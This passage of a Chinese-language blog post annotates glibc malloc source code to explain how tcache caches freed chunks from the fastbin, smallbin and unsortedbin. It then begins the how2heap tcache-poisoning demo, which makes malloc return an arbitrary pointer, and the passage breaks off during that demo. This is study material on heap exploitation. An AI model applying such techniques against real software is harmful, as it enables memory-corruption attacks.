class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="type">void</span> *victim;</span><br><span class="line">	....</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* int_free also calls request2size, be careful to not pad twice.  */</span></span><br><span class="line">  <span class="type">size_t</span> tbytes;</span><br><span class="line">  checked_request2size (bytes, tbytes);</span><br><span class="line">  <span class="type">size_t</span> tc_idx = csize2tidx (tbytes);<span class="comment">//计算应该到哪个tcache中取堆块</span></span><br><span class="line"></span><br><span class="line">  MAYBE_INIT_TCACHE ();</span><br><span class="line"></span><br><span class="line">  DIAG_PUSH_NEEDS_COMMENT;</span><br><span class="line">  <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins		<span class="comment">//tc_idx是否落在tcache范围内,也就是说堆块大小是不是在tcache管理范围内</span></span><br><span class="line">      <span class="comment">/*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/</span> <span class="comment">/* to appease gcc */</span></span><br><span class="line">      &amp;&amp; tcache	<span class="comment">//是否已经初始化</span></span><br><span class="line">      &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="literal">NULL</span>)		<span class="comment">//对应的桶子中是否有剩余堆块</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> tcache_get (tc_idx);	<span class="comment">//哪一个堆块,返回值,由于tcache中指针自然指向mem区域,因此不需要再指针转换</span></span><br><span class="line">    &#125;</span><br><span class="line">  DIAG_POP_NEEDS_COMMENT;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    ....</span><br></pre></td></tr></table></figure>

<h3 id="int-malloc"><a href="#int-malloc" class="headerlink" title="int_malloc"></a>int_malloc</h3><p>fastbin和smallbin的缓存算法基本一致</p>
<p>unsortedbin的缓存算法比较复杂</p>
<p>largebin不需要缓存</p>
<h4 id="对fastbin的缓存"><a href="#对fastbin的缓存" class="headerlink" title="对fastbin的缓存"></a>对fastbin的缓存</h4><p>fastbin中的分配规则为:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">如果对应nb的fastbin中有至少一个堆块,首先把这个堆块拿出来放到victim上</span><br><span class="line">然后把这个桶子中其他堆块拆下来,塞进tcache,直到tcache的对应桶子中塞满7个为止</span><br><span class="line">最后返回那个victim</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  if ((unsigned long)(nb) &lt;= (unsigned long)(get_max_fast()))</span><br><span class="line">  &#123;</span><br><span class="line">    idx = fastbin_index(nb);</span><br><span class="line">    mfastbinptr *fb = &amp;fastbin(av, idx);</span><br><span class="line">    mchunkptr pp;</span><br><span class="line">    victim = *fb;</span><br><span class="line"></span><br><span class="line">    if (victim != NULL)</span><br><span class="line">    &#123;</span><br><span class="line">      if (SINGLE_THREAD_P)//单线程的情况</span><br><span class="line">        *fb = victim-&gt;fd;</span><br><span class="line">      else//多线程的情况</span><br><span class="line">        REMOVE_FB(fb, pp, victim);//首先拿出一个堆块来</span><br><span class="line">      if (__glibc_likely(victim != NULL))</span><br><span class="line">      &#123;</span><br><span class="line">        size_t victim_idx = fastbin_index(chunksize(victim));</span><br><span class="line">        if (__builtin_expect(victim_idx != idx, 0))</span><br><span class="line">          malloc_printerr(&quot;malloc(): memory corruption (fast)&quot;);</span><br><span class="line">        check_remalloced_chunk(av, victim, nb);</span><br><span class="line">#if USE_TCACHE				//已经拿出了一个符合要求的堆块,剩余的堆块放到tcache中缓存(直到tcache满),如果tcache满了就不再往里塞了</span><br><span class="line">        /* While we&#x27;re here, if we see other chunks of the same size,</span><br><span class="line">     stash them in the tcache.  */</span><br><span class="line">        size_t tc_idx = csize2tidx(nb);</span><br><span class="line">        if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">        &#123;</span><br><span class="line">          mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">          /* While bin not empty and tcache not full, copy chunks.  */</span><br><span class="line">          while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count &amp;&amp; (tc_victim = *fb) != NULL)</span><br><span class="line">          &#123;</span><br><span class="line">            if (SINGLE_THREAD_P)</span><br><span class="line">              *fb = tc_victim-&gt;fd;</span><br><span class="line">            else</span><br><span class="line">            &#123;</span><br><span class="line">              REMOVE_FB(fb, pp, tc_victim);</span><br><span class="line">              if (__glibc_unlikely(tc_victim == NULL))</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">            tcache_put(tc_victim, tc_idx);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">#endif</span><br><span class="line">        void *p = chunk2mem(victim);</span><br><span class="line">        alloc_perturb(p, bytes);</span><br><span class="line">        return p;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>



<h4 id="对smallbin的缓存"><a href="#对smallbin的缓存" class="headerlink" title="对smallbin的缓存"></a>对smallbin的缓存</h4><p>smallbin的分配规则</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">如果对应smallbin中有至少一个堆块,把他拿下来放到victim上</span><br><span class="line">该smallbin桶子中剩余的堆块放到对应tcache上,直到放满7个</span><br><span class="line">最后返回victim</span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">if</span> (in_smallbin_range(nb))</span><br><span class="line">  &#123;</span><br><span class="line">    idx = smallbin_index(nb);</span><br><span class="line">    bin = bin_at(av, idx);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((victim = last(bin)) != bin)<span class="comment">//首先取出一个last(bin)堆块来给victim</span></span><br><span class="line">    &#123;</span><br><span class="line">      bck = victim-&gt;bk;</span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely(bck-&gt;fd != victim))</span><br><span class="line">        malloc_printerr(<span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>);</span><br><span class="line">      set_inuse_bit_at_offset(victim, nb);</span><br><span class="line">      bin-&gt;bk = bck;<span class="comment">//将victim从链上摘下来</span></span><br><span class="line">      bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">        set_non_main_arena(victim);</span><br><span class="line">      check_malloced_chunk(av, victim, nb);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE			<span class="comment">//本桶子中剩余的堆块塞进tcache,塞满7个为止,多余的仍在smallbin中放着</span></span></span><br><span class="line">      <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">         stash them in the tcache.  */</span></span><br><span class="line">      <span class="type">size_t</span> tc_idx = csize2tidx(nb);</span><br><span class="line">      <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">      &#123;</span><br><span class="line">        mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">        <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count &amp;&amp; (tc_victim = last(bin)) != bin)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">          &#123;</span><br><span class="line">            bck = tc_victim-&gt;bk;</span><br><span class="line">            set_inuse_bit_at_offset(tc_victim, nb);</span><br><span class="line">            <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">              set_non_main_arena(tc_victim);</span><br><span class="line">            bin-&gt;bk = bck;</span><br><span class="line">            bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">            tcache_put(tc_victim, tc_idx);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      <span class="type">void</span> *p = chunk2mem(victim);</span><br><span class="line">      alloc_perturb(p, bytes);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<h4 id="对unsortedbin的缓存"><a href="#对unsortedbin的缓存" class="headerlink" title="对unsortedbin的缓存"></a>对unsortedbin的缓存</h4><p>对unsortedbin的缓存算法是这样的:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">拿出一个victim,如果是last_remainder,并且大小合适,则直接从其上进行分割然后 返回,不会进行缓存</span><br><span class="line">否则</span><br><span class="line">	如果victim大小正好满足要求,不急着返回,而是首先尝试将其放到tcache中缓存</span><br><span class="line">		如果tcache有空位置则放进去,然后tcache_nb置1表明至少tcache中有一个适配堆块</span><br><span class="line">		如果tcache没有位置则直接 返回</span><br><span class="line">	如果victim大小不满足要求,则根据其大小放到smallbin或者largebin</span><br><span class="line">如果tcache_nb标志为1,并且在unsortedbin中转了足够多圈了,从tcache_nb 返回</span><br><span class="line">否则重新循环</span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">while</span> ((victim = unsorted_chunks(av)-&gt;bk) != unsorted_chunks(av))<span class="comment">//每次拿出一个堆块交给victim</span></span><br><span class="line">    &#123;</span><br><span class="line">      bck = victim-&gt;bk;</span><br><span class="line">      <span class="keyword">if</span> (__builtin_expect(chunksize_nomask(victim) &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>) || __builtin_expect(chunksize_nomask(victim) &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">        malloc_printerr(<span class="string">&quot;malloc(): memory corruption&quot;</span>);</span><br><span class="line">      size = chunksize(victim);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">         If a small request, try to use last remainder if it is the</span></span><br><span class="line"><span class="comment">         only chunk in unsorted bin.  This helps promote locality for</span></span><br><span class="line"><span class="comment">         runs of consecutive small requests. This is the only</span></span><br><span class="line"><span class="comment">         exception to best-fit, and applies only when there is</span></span><br><span class="line"><span class="comment">         no exact fit for a small chunk.</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (in_smallbin_range(nb) &amp;&amp;</span><br><span class="line">          bck == unsorted_chunks(av) &amp;&amp;</span><br><span class="line">          victim == av-&gt;last_remainder &amp;&amp;</span><br><span class="line">          (<span class="type">unsigned</span> <span class="type">long</span>)(size) &gt; (<span class="type">unsigned</span> <span class="type">long</span>)(nb + MINSIZE))</span><br><span class="line">      &#123;<span class="comment">//如果是last_remainder则直接分配,此时不会再进行tcache缓存,推测原因是last_remainder刚用过,还在内存中,命中概率大</span></span><br><span class="line">        <span class="comment">/* split and reattach remainder */</span></span><br><span class="line">        remainder_size = size - nb;</span><br><span class="line">        remainder = chunk_at_offset(victim, nb);</span><br><span class="line">        unsorted_chunks(av)-&gt;bk = unsorted_chunks(av)-&gt;fd = remainder;</span><br><span class="line">        av-&gt;last_remainder = remainder;</span><br><span class="line">        remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks(av);</span><br><span class="line">        <span class="keyword">if</span> (!in_smallbin_range(remainder_size))</span><br><span class="line">        &#123;</span><br><span class="line">          remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">          remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        set_head(victim, nb | PREV_INUSE |</span><br><span class="line">                             (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">        set_head(remainder, remainder_size | PREV_INUSE);</span><br><span class="line">        set_foot(remainder, remainder_size);</span><br><span class="line"></span><br><span class="line">        check_malloced_chunk(av, victim, nb);</span><br><span class="line">        <span class="type">void</span> *p = chunk2mem(victim);</span><br><span class="line">        alloc_perturb(p, bytes);</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">      &#125;</span><br><span class="line">	<span class="comment">//不是last_remainder</span></span><br><span class="line">      <span class="comment">/* remove from unsorted list */</span></span><br><span class="line">      unsorted_chunks(av)-&gt;bk = bck;<span class="comment">//把victim拆下来</span></span><br><span class="line">      bck-&gt;fd = unsorted_chunks(av);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Take now instead of binning if exact fit */</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (size == nb)<span class="comment">//如果当前堆块的大小符合要求,不会立刻分配,首先应该放到tcache中</span></span><br><span class="line">      &#123;</span><br><span class="line">        set_inuse_bit_at_offset(victim, size);</span><br><span class="line">        <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">          set_non_main_arena(victim);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">        <span class="comment">/* Fill cache first, return to user only if cache fills.</span></span><br><span class="line"><span class="comment">     We may return one of these chunks later.  */</span></span><br><span class="line">        <span class="keyword">if</span> (tcache_nb &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">        &#123;</span><br><span class="line">          tcache_put(victim, tc_idx);</span><br><span class="line">          return_cached = <span class="number">1</span>;<span class="comment">//记录至少有一个堆块放到了tcache,待会儿就可以从tcache中拿堆块了</span></span><br><span class="line">          <span class="keyword">continue</span>;	<span class="comment">//continue直接跳到while一开始拿下一个堆块了</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span><span class="comment">//直到对应tcache存满了才会直接进行分配</span></span><br><span class="line">        &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">          check_malloced_chunk(av, victim, nb);</span><br><span class="line">          <span class="type">void</span> *p = chunk2mem(victim);</span><br><span class="line">          alloc_perturb(p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">        &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      &#125;</span><br><span class="line">		<span class="comment">//到此说明victim既不是last_remainder,大小也不是正合适</span></span><br><span class="line">      <span class="comment">/* place chunk in bin */</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (in_smallbin_range(size))<span class="comment">//如果victim是smallbin范围的</span></span><br><span class="line">      &#123;</span><br><span class="line">        victim_index = smallbin_index(size);<span class="comment">//放进smallbin</span></span><br><span class="line">        bck = bin_at(av, victim_index);</span><br><span class="line">        fwd = bck-&gt;fd;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span><span class="comment">//否则说明是largebin中的,放到largebin,不会进入smallbin</span></span><br><span class="line">      &#123;</span><br><span class="line">        victim_index = largebin_index(size);</span><br><span class="line">        bck = bin_at(av, victim_index);</span><br><span class="line">        fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">        <span class="keyword">if</span> (fwd != bck)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">          size |= PREV_INUSE;</span><br><span class="line">          <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">          assert(chunk_main_arena(bck-&gt;bk));</span><br><span class="line">          <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(size) &lt; (<span class="type">unsigned</span> <span class="type">long</span>)chunksize_nomask(bck-&gt;bk))</span><br><span class="line">          &#123;</span><br><span class="line">            fwd = bck;</span><br><span class="line">            bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">            victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">            victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">            fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            assert(chunk_main_arena(fwd));</span><br><span class="line">            <span class="keyword">while</span> ((<span class="type">unsigned</span> <span class="type">long</span>)size &lt; chunksize_nomask(fwd))</span><br><span class="line">            &#123;</span><br><span class="line">              fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">              assert(chunk_main_arena(fwd));</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)size == (<span class="type">unsigned</span> <span class="type">long</span>)chunksize_nomask(fwd))</span><br><span class="line">              <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">              fwd = fwd-&gt;fd;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              victim-&gt;fd_nextsize = fwd;</span><br><span class="line">              victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">              fwd-&gt;bk_nextsize = victim;</span><br><span class="line">              victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">            &#125;</span><br><span class="line">            bck = fwd-&gt;bk;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      mark_bin(av, victim_index);</span><br><span class="line">      victim-&gt;bk = bck;</span><br><span class="line">      victim-&gt;fd = fwd;</span><br><span class="line">      fwd-&gt;bk = victim;</span><br><span class="line">      bck-&gt;fd = victim;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">      <span class="comment">/* If we&#x27;ve processed as many chunks as we&#x27;re allowed while</span></span><br><span class="line"><span class="comment">   filling the cache, return one of the cached ones.  */</span></span><br><span class="line">      ++tcache_unsorted_count;<span class="comment">//unsortedbin中最大可以容忍的缓存次数</span></span><br><span class="line">      <span class="keyword">if</span> (return_cached &amp;&amp; mp_.tcache_unsorted_limit &gt; <span class="number">0</span> &amp;&amp; tcache_unsorted_count &gt; mp_.tcache_unsorted_limit)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">return</span> tcache_get(tc_idx);</span><br><span class="line">      &#125;<span class="comment">//结算阶段,如果return_cached是正合适大小的堆块入tcache的标记,如果被置1说明至少能从tcache中找到一个合适的堆块</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_ITERS 10000</span></span><br><span class="line">      <span class="keyword">if</span> (++iters &gt;= MAX_ITERS)</span><br><span class="line">        <span class="keyword">break</span>;<span class="comment">//unsortedbin这里的循环最多10000次</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<p>跳出unsortedbin循环,再检查一次tcache中是否有合适堆块</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">    <span class="comment">/* If all the small chunks we found ended up cached, return one now.  */</span></span><br><span class="line">    <span class="keyword">if</span> (return_cached)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> tcache_get(tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>





<p>后面使用largebin和topchunk进行分配时不会有tcache的缓存使用了</p>
<h3 id="int-free"><a href="#int-free" class="headerlink" title="int_free"></a>int_free</h3><p>释放时的tcache操作很简单,只在int_free中有一个</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">size_t</span> tc_idx = csize2tidx(size);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">    &#123;</span><br><span class="line">      tcache_put(p, tc_idx);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<p>如果这堆块的大小在tcache的管理范围内,那么在一切释放工作开始之前,首先尝试将这个堆块放到tcache中</p>
<p>如果缓存则直接返回</p>
<h2 id="how2heap"><a href="#how2heap" class="headerlink" title="how2heap"></a>how2heap</h2><h3 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache_poisoning"></a>tcache_poisoning</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">// disable buffering</span></span><br><span class="line">	setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">	setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This file demonstrates a simple tcache poisoning attack by tricking malloc into\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;returning a pointer to an arbitrary location (in this case, the stack).\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;The attack is very similar to fastbin corruption attack.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;After the patch https://sourceware.org/git/?p=glibc.git;a=commit;h=77dc0d8643aa99c92bf671352b0a8adde705896f,\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;We have to create and free one more chunk for padding before fd pointer 